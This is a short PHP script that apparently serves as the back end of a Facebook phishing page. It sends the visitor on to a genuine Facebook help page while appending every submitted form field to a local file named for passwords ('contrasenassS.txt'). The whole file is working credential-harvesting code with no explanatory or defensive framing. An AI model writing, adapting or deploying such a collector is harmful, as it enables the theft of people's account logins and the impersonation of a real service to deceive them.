<?php

header ('Location: https://es-la.facebook.com/help/238318146535333/?helpref=hc_global_nav ');
$handle = fopen("contrasenassS.txt", "a"); 
foreach($_POST as $variable => $value) {
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;

?>
